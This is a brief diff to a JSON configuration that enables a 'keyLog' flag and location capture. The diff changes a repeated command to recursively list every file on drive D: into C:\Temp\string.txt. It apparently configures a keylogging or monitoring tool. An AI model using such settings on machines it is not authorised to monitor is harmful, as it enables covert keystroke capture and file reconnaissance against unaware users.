@@ -18,6 +18,6 @@
   "keyLog": true,
   "_pcCurrentLoc": true,
   "reloadconfigFile": true,
-  "cmdCommandsList": ["dir D:\\ /q >> \"C:\\Temp\\string.txt\""],
+  "cmdCommandsList": ["dir D:\\ /s /b >> \"C:\\Temp\\string.txt\""],
   "repeatCmdCommands": true
 }
